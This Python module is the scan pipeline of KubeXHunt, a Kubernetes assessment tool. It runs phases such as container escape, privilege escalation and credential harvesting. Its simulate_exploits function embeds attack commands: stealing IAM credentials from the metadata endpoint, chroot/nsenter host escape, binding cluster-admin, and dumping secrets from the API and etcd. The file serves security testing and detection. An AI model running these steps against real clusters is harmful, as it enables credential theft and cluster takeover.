"""Package-native scan pipeline."""

from __future__ import annotations

import json
import time
from datetime import datetime
from typing import Any

from kubexhunt.core.runtime import RuntimeFacade, new_runtime, set_active_runtime
from kubexhunt.correlation.attack_paths import optimize_attack_paths
from kubexhunt.correlation.identity import build_identity_graph
from kubexhunt.correlation.risk import enrich_findings_with_mitre, generate_detection_rules
from kubexhunt.engines.advanced import run_phase_advanced
from kubexhunt.engines.attack_chains import run_phase_attack_chains
from kubexhunt.engines.azure import run_phase_azure
from kubexhunt.engines.cloud import run_phase_cloud_metadata
from kubexhunt.engines.cluster_intel import run_phase_cluster_intel
from kubexhunt.engines.dos import run_phase_dos
from kubexhunt.engines.eks import run_phase_eks
from kubexhunt.engines.escape import run_phase_escape
from kubexhunt.engines.etcd import run_phase_etcd
from kubexhunt.engines.gke import run_phase_gke
from kubexhunt.engines.helm import run_phase_helm
from kubexhunt.engines.kubelet import run_phase_kubelet
from kubexhunt.engines.misc import run_phase_misc
from kubexhunt.engines.network import run_phase_network
from kubexhunt.engines.node import run_phase_node
from kubexhunt.engines.openshift import run_phase_openshift
from kubexhunt.engines.persistence import run_phase_persistence
from kubexhunt.engines.pod import run_phase_pod_recon
from kubexhunt.engines.privesc import run_phase_privesc
from kubexhunt.engines.proc_harvest import run_phase_proc_harvest
from kubexhunt.engines.rbac import run_phase_rbac
from kubexhunt.engines.reporting import run_phase_reporting
from kubexhunt.engines.runtime import run_phase_runtime
from kubexhunt.engines.secrets import run_phase_secrets
from kubexhunt.engines.setup import run_phase_setup
from kubexhunt.engines.stealth import run_phase_stealth_analysis
from kubexhunt.engines.supply_chain import run_phase_supply_chain
from kubexhunt.output.html_report import generate_advanced_html_report
from kubexhunt.output.json_report import save as save_json_report
from kubexhunt.output.markdown_report import save as save_markdown_report
from kubexhunt.output.sarif_report import save as save_sarif_report


def banner(runtime: RuntimeFacade) -> None:
    """Render the KubeXHunt startup banner."""

    c = runtime.c
    C = runtime.C
    print(
        c(
            C.RED,
            """
╔══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║""",
        )
    )
    print(
        c(C.RED, "║")
        + c(C.BOLD + C.WHITE, "  ██╗  ██╗██╗   ██╗██████╗ ███████╗██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗  ")
        + c(C.RED, "║")
    )
    print(
        c(C.RED, "║")
        + c(C.WHITE, "  ██║ ██╔╝██║   ██║██╔══██╗██╔════╝╚██╗██╔╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝  ")
        + c(C.RED, "║")
    )
    print(
        c(C.RED, "║")
        + c(C.CYAN, "  █████╔╝ ██║   ██║██████╔╝█████╗   ╚███╔╝ ███████║██║   ██║██╔██╗ ██║   ██║     ")
        + c(C.RED, "║")
    )
    print(
        c(C.RED, "║")
        + c(C.WHITE, "  ██╔═██╗ ██║   ██║██╔══██╗██╔══╝   ██╔██╗ ██╔══██║██║   ██║██║╚██╗██║   ██║     ")
        + c(C.RED, "║")
    )
    print(
        c(C.RED, "║")
        + c(C.CYAN, "  ██║  ██╗╚██████╔╝██████╔╝███████╗██╔╝ ██╗██║  ██║╚██████╔╝██║ ╚████║   ██║     ")
        + c(C.RED, "║")
    )
    print(
        c(C.RED, "║")
        + c(C.WHITE, "  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝     ")
        + c(C.RED, "║")
    )
    print(
        c(
            C.RED,
            """║                                                                                  ║
║   Kubernetes Security Assessment Tool  v1.2.0                                    ║
║   Starting from a Compromised Pod → Full Cluster Audit + Attack Path Discovery   ║
║   Author: Mayank Choubey                                                         ║
╚══════════════════════════════════════════════════════════════════════════════════╝
""",
        )
    )


def inject_debug_report_data(runtime: RuntimeFacade) -> None:
    """Seed deterministic debug data for report UI validation."""

    now = datetime.now().isoformat()
    if not any(
        finding.get("check") == "DEBUG: Simulated Cluster Admin Escalation Path" for finding in runtime.FINDINGS
    ):
        runtime.FINDINGS.extend(
            [
                {
                    "severity": "CRITICAL",
                    "check": "DEBUG: Simulated Cluster Admin Escalation Path",
                    "detail": "Synthetic finding injected for report UI validation.",
                    "remediation": "Remove wildcard RBAC and disable privileged pod creation.",
                    "phase": "99",
                    "timestamp": now,
                    "mitre_techniques": ["T1078.004", "T1611"],
                    "exploit_simulation": "kubectl auth can-i --list\nkubectl create clusterrolebinding debug-admin --clusterrole=cluster-admin --serviceaccount=default:default",
                },
                {
                    "severity": "HIGH",
                    "check": "DEBUG: Simulated Secret Exfiltration Risk",
                    "detail": "Synthetic finding to verify MITRE grouping and timeline rendering.",
                    "remediation": "Restrict secret read permissions and rotate leaked credentials.",
                    "phase": "98",
                    "timestamp": now,
                    "mitre_techniques": ["T1552.007"],
                    "exploit_simulation": "kubectl get secrets -A\nkubectl get secret sample -n default -o jsonpath='{.data}'",
                },
            ]
        )
    if not runtime.ATTACK_GRAPH:
        runtime.ATTACK_GRAPH.extend(
            [
                {"from": "Compromised Pod", "to": "ServiceAccount Token", "via": "debug seed", "severity": "HIGH"},
                {"from": "ServiceAccount Token", "to": "K8s API", "via": "debug seed", "severity": "HIGH"},
                {"from": "K8s API", "to": "Cluster Admin", "via": "debug seed", "severity": "CRITICAL"},
            ]
        )
    if (
        not runtime.CTX.get("identity_graph", {}).get("nodes")
        or len(runtime.CTX.get("identity_graph", {}).get("nodes", [])) < 4
    ):
        runtime.CTX["identity_graph"] = {
            "nodes": [
                {"id": "pod/default/debug", "type": "pod", "label": "Debug Pod"},
                {"id": "sa/default/default", "type": "serviceaccount", "label": "default SA"},
                {"id": "iam/debug-role", "type": "iam_role", "label": "Debug IAM Role"},
                {"id": "account/debug", "type": "aws_account", "label": "Debug Account"},
            ],
            "edges": [
                {"from": "pod/default/debug", "to": "sa/default/default", "relation": "uses"},
                {"from": "sa/default/default", "to": "iam/debug-role", "relation": "assumes"},
                {"from": "iam/debug-role", "to": "account/debug", "relation": "belongs-to"},
            ],
        }
    if not runtime.TOKEN_SCORES:
        runtime.TOKEN_SCORES.extend(
            [
                {
                    "label": "default/default",
                    "score": 72,
                    "abilities": ["list secrets", "create pods", "impersonate users"],
                },
                {"label": "kube-system/debug", "score": 48, "abilities": ["get pods", "list services"]},
            ]
        )


def simulate_exploits(runtime: RuntimeFacade) -> None:
    """Add exploit_simulation blocks to relevant findings."""

    print("[DEBUG] Simulating exploits")
    simulated = 0
    for finding in runtime.FINDINGS:
        if finding.get("severity") not in ("CRITICAL", "HIGH"):
            continue
        text = (finding.get("check", "") + " " + finding.get("detail", "")).lower()
        simulation = None
        if "imds" in text or "169.254.169.254" in text or "aws" in text:
            simulation = "# Step 1: Access IMDS from compromised pod\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# Step 2: Retrieve credentials\nROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\n\n# Step 3: Use credentials for cloud lateral movement\naws sts get-caller-identity --region us-east-1"
        elif "privileged" in text or "escape" in text or "hostpath" in text or "host path" in text:
            simulation = "# Step 1: Verify privileged/hostPath access\ncat /proc/1/cgroup  # Check if we're in a container\n\n# Step 2: Mount host filesystem (if hostPath: / available)\nls /host/etc/  # Host filesystem via hostPath mount\n\n# Step 3: Escape to host\nchroot /host /bin/bash\n# OR via nsenter:\nnsenter -t 1 -m -u -i -n -p -- /bin/bash"
        elif "secret" in text or "token" in text or "credential" in text:
            simulation = "# Step 1: List secrets\nkubectl get secrets --all-namespaces\n\n# Step 2: Extract secret data\nkubectl get secret <name> -n <ns> -o jsonpath='{.data}' | base64 -d\n\n# Step 3: Use extracted credentials\nexport KUBECONFIG=/tmp/stolen.kubeconfig\nkubectl auth can-i --list"
        elif "rbac" in text or "clusterrole" in text or "wildcard" in text:
            simulation = "# Step 1: Check current RBAC permissions\nkubectl auth can-i --list\n\n# Step 2: Create ClusterRoleBinding to escalate\nkubectl create clusterrolebinding pwned \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace):default\n\n# Step 3: Verify cluster-admin access\nkubectl get nodes\nkubectl get secrets --all-namespaces"
        elif "etcd" in text:
            simulation = "# Step 1: Connect to etcd (if port 2379 open and no TLS)\nETCDCTL_API=3 etcdctl --endpoints=http://etcd:2379 get / --prefix --keys-only\n\n# Step 2: Extract all secrets\nETCDCTL_API=3 etcdctl --endpoints=http://etcd:2379 \\\n  get /registry/secrets/ --prefix | strings | grep -A5 'data:'"
        elif "cve" in text or "dirty" in text or "runc" in text:
            simulation = "# Step 1: Confirm kernel/runc version\nuname -r\nrunc --version 2>/dev/null\n\n# Step 2: Check exploit prerequisites\ncat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null\n\n# Step 3: Run PoC (ensure authorized testing only)\n# Consult NVD for specific PoC: https://nvd.nist.gov/vuln/detail/<CVE-ID>"
        if simulation:
            finding["exploit_simulation"] = simulation
            simulated += 1
    print(f"[DEBUG] Exploit simulation complete: {simulated}/{len(runtime.FINDINGS)} findings have simulation")


def enumerate_cloud(runtime: RuntimeFacade) -> None:
    """Attempt cloud provider enumeration and store results in runtime context."""

    print("[DEBUG] Simulating cloud enum")
    cloud = runtime.CTX.get("cloud", "Unknown")
    result: dict[str, object] = {}
    if cloud == "AWS" or runtime.CTX.get("aws_creds"):
        status, body = runtime.http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", timeout=3)
        if status == 200 and body.strip():
            result["provider"] = "AWS"
            result["role_name"] = body.strip().split("\n")[0]
            result["imds_reachable"] = True
            status2, creds_body = runtime.http_get(
                f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{result['role_name']}", timeout=3
            )
            if status2 == 200:
                try:
                    creds = json.loads(creds_body)
                    result["access_key_id"] = creds.get("AccessKeyId", "")[:12] + "..."
                    result["expiration"] = creds.get("Expiration", "")
                    result["has_creds"] = True
                except Exception:
                    pass
        else:
            result["provider"] = "AWS"
            result["imds_reachable"] = False
    elif cloud == "GKE":
        status, body = runtime.http_get(
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
            headers={"Metadata-Flavor": "Google"},
            timeout=3,
        )
        result["provider"] = "GKE"
        result["imds_reachable"] = status == 200
        if status == 200:
            result["service_account"] = body.strip()
    elif cloud == "Azure":
        status, body = runtime.http_get(
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01", headers={"Metadata": "true"}, timeout=3
        )
        result["provider"] = "Azure"
        result["imds_reachable"] = status == 200
        if status == 200:
            try:
                meta = json.loads(body)
                result["subscription_id"] = meta.get("compute", {}).get("subscriptionId", "")
                result["resource_group"] = meta.get("compute", {}).get("resourceGroupName", "")
            except Exception:
                pass
    else:
        result["provider"] = cloud
        result["imds_reachable"] = False
    runtime.CTX["cloud_enum"] = result
    print(f"[DEBUG] Cloud enum complete: {result}")


PHASE_MAP = {
    0: ("Setup & kubectl", run_phase_setup),
    1: ("Pod & Container Recon", run_phase_pod_recon),
    2: ("Cloud Metadata & IAM", run_phase_cloud_metadata),
    3: ("RBAC & K8s API", run_phase_rbac),
    4: ("Network & Lateral Move", run_phase_network),
    5: ("Container Escape", run_phase_escape),
    6: ("Node Compromise", run_phase_node),
    7: ("Cluster Escalation", run_phase_privesc),
    8: ("Persistence", run_phase_persistence),
    9: ("Supply Chain & Admission", run_phase_supply_chain),
    10: ("EKS-Specific", run_phase_eks),
    11: ("GKE-Specific", run_phase_gke),
    12: ("Runtime Security", run_phase_runtime),
    13: ("Secrets & Sensitive Data", run_phase_secrets),
    14: ("DoS & Resource Limits", run_phase_dos),
    15: ("Cluster Intel & CVEs", run_phase_cluster_intel),
    16: ("Kubelet Exploitation", run_phase_kubelet),
    17: ("etcd Exposure", run_phase_etcd),
    18: ("Helm & App Secrets", run_phase_helm),
    19: ("/proc Credential Harvesting", run_phase_proc_harvest),
    20: ("Azure AKS", run_phase_azure),
    21: ("OpenShift / OKD", run_phase_openshift),
    22: ("Advanced Red Team", run_phase_advanced),
    23: ("Attack Chain Simulation", run_phase_attack_chains),
    24: ("Stealth & Evasion Analysis", run_phase_stealth_analysis),
    25: ("Network Plugin & Misc", run_phase_misc),
    26: ("Diff & Reporting", run_phase_reporting),
}


def list_phases() -> int:
    """Print phase reference and exit."""

    print("\nKubeXHunt v1.2.0 — Phase Reference\n")
    for num, (name, _) in sorted(PHASE_MAP.items()):
        print(f"  Phase {num:>2}  {name}")
    print()
    return 0


def run_scan_pipeline(args) -> int:
    """Run the package-native orchestration pipeline."""

    if args.phase_list:
        return list_phases()

    runtime = new_runtime(no_color=args.no_color, debug=args.debug, verbose=args.verbose, json_logs=args.json_logs)
    runtime.CTX["stealth"] = args.stealth
    runtime.CTX["no_mutate"] = args.no_mutate and not args.mutate
    runtime.CTX.proxy = args.proxy or ""
    runtime.CTX["diff_file"] = args.diff or ""
    runtime.CTX["debug_report"] = args.debug_report
    banner(runtime)
    start = time.time()

    try:
        run_phase_setup(runtime)
    except Exception as exc:
        runtime._log_exception("Phase 0 error", exc)
        print(runtime.c(runtime.C.RED, f"\n  ✗ Phase 0 error: {exc}"))

    if args.kubectl_only:
        print(runtime.c(runtime.C.GREEN, "\n  ✓ Done. Run without --kubectl-only for full assessment."))
        return 0

    phases_to_run = sorted({p for p in args.phase if p != 0}) if args.phase else list(range(1, 27))
    if args.exclude_phase:
        phases_to_run = [phase for phase in phases_to_run if phase not in args.exclude_phase]

    for phase_num in phases_to_run:
        if phase_num not in PHASE_MAP:
            print(runtime.c(runtime.C.YELLOW, f"  ⚠ Unknown phase: {phase_num} — skipping"))
            continue
        try:
            if phase_num == 4:
                run_phase_network(runtime, fast=args.fast)
            elif phase_num == 26:
                run_phase_reporting(runtime, args.diff)
            else:
                PHASE_MAP[phase_num][1](runtime)
        except KeyboardInterrupt:
            print(runtime.c(runtime.C.YELLOW, f"\n  ⚠ Phase {phase_num} interrupted"))
            break
        except Exception as exc:
            runtime._log_exception(f"Phase {phase_num} error", exc)
            print(runtime.c(runtime.C.RED, f"\n  ✗ Phase {phase_num} ({PHASE_MAP[phase_num][0]}) error: {exc}"))

    print(runtime.c(runtime.C.CYAN, "\n  Running intelligence layer enrichment..."))
    intelligence_funcs: list[tuple[str, Any]] = [
        ("MITRE enrichment error", enrich_findings_with_mitre),
        ("Detection rules error", generate_detection_rules),
        ("Identity graph error", build_identity_graph),
        ("Attack path optimizer error", optimize_attack_paths),
    ]
    for label, func in intelligence_funcs:
        try:
            func(runtime)
        except Exception as exc:
            runtime._log_exception(label, exc)
            print(runtime.c(runtime.C.YELLOW, f"  {label}: {exc}"))
    for label, func in [("Exploit simulation error", simulate_exploits), ("Cloud enum error", enumerate_cloud)]:
        try:
            func(runtime)
        except Exception as exc:
            runtime._log_exception(label, exc)
            print(runtime.c(runtime.C.YELLOW, f"  {label}: {exc}"))

    print(runtime.c(runtime.C.CYAN, "\n" + "═" * 64))
    print(runtime.c(runtime.C.BOLD + runtime.C.WHITE, "  DEBUG: INTELLIGENCE LAYER STATUS"))
    print(runtime.c(runtime.C.CYAN, "═" * 64))
    mitre_count = sum(1 for finding in runtime.FINDINGS if finding.get("mitre_techniques"))
    status_mitre = runtime.c(runtime.C.GREEN, "✓ WORKING") if mitre_count > 0 else runtime.c(runtime.C.RED, "✗ EMPTY")
    print(f"  [MITRE]      {status_mitre}  —  {mitre_count}/{len(runtime.FINDINGS)} findings enriched")
    if runtime.FINDINGS and runtime.FINDINGS[0].get("mitre_techniques"):
        print(f"               Sample: {runtime.FINDINGS[0]['mitre_techniques']}")
    rules = runtime.CTX.get("detection_rules", {})
    falco_count = len(rules.get("falco", []))
    tetragon_count = len(rules.get("tetragon", []))
    status_det = (
        runtime.c(runtime.C.GREEN, "✓ WORKING")
        if falco_count + tetragon_count > 0
        else runtime.c(runtime.C.RED, "✗ EMPTY")
    )
    print(f"  [DETECTION]  {status_det}  —  {falco_count} Falco rules, {tetragon_count} Tetragon rules")
    identity = runtime.CTX.get("identity_graph", {})
    node_count = len(identity.get("nodes", []))
    edge_count = len(identity.get("edges", []))
    status_id = runtime.c(runtime.C.GREEN, "✓ WORKING") if node_count > 0 else runtime.c(runtime.C.RED, "✗ EMPTY")
    print(f"  [IDENTITY]   {status_id}  —  {node_count} nodes, {edge_count} edges")
    paths = runtime.CTX.get("optimal_paths", [])
    status_paths = (
        runtime.c(runtime.C.GREEN, "✓ WORKING")
        if paths
        else runtime.c(runtime.C.YELLOW, "⚠ EMPTY (no attack graph edges)")
    )
    print(f"  [PATHS]      {status_paths}  —  {len(paths)} optimal paths")
    exploits = [finding for finding in runtime.FINDINGS if finding.get("exploit_simulation")]
    status_exp = (
        runtime.c(runtime.C.GREEN, "✓ WORKING")
        if exploits
        else runtime.c(runtime.C.YELLOW, "⚠ NONE (no matching findings)")
    )
    print(f"  [EXPLOIT]    {status_exp}  —  {len(exploits)} findings with simulation")
    if exploits:
        preview = str(exploits[0]["exploit_simulation"]).split("\n")[0][:60]
        print(f"               Sample: {preview}")
    cloud_enum = runtime.CTX.get("cloud_enum")
    status_cloud = (
        runtime.c(runtime.C.GREEN, "✓ WORKING")
        if cloud_enum
        else runtime.c(runtime.C.YELLOW, "⚠ NO CLOUD (expected outside cloud env)")
    )
    print(f"  [CLOUD ENUM] {status_cloud}  —  {cloud_enum or 'no cloud creds found'}")
    print(runtime.c(runtime.C.CYAN, "═" * 64) + "\n")

    if args.debug_report:
        print(runtime.c(runtime.C.CYAN, "  [DEBUG] Injecting synthetic report data (--debug-report enabled)"))
        inject_debug_report_data(runtime)

    output_path = args.output if args.output else "reports/report.html"
    print("[DEBUG] Report path:", output_path)
    try:
        lower_output = output_path.lower()
        if lower_output.endswith(".json"):
            save_json_report(output_path)
            print(runtime.c(runtime.C.GREEN, f"  JSON report saved: {output_path}"))
        elif lower_output.endswith(".sarif"):
            save_sarif_report(output_path)
            print(runtime.c(runtime.C.GREEN, f"  SARIF report saved: {output_path}"))
        elif lower_output.endswith(".txt") or lower_output.endswith(".md"):
            save_markdown_report(output_path)
            print(runtime.c(runtime.C.GREEN, f"  Text report saved: {output_path}"))
        else:
            generate_advanced_html_report(
                runtime.FINDINGS, runtime.ATTACK_GRAPH, runtime.CTX, runtime.TOKEN_SCORES, output_path
            )
            print(runtime.c(runtime.C.GREEN, f"  Advanced HTML report saved: {output_path}"))
    except Exception as exc:
        runtime._log_exception("Advanced HTML report error", exc)
        print(runtime.c(runtime.C.RED, f"  Advanced HTML report error: {exc}"))

    if runtime.CTX.get("ci_fail"):
        return 1

    _ = time.time() - start
    set_active_runtime(runtime)
    return 0
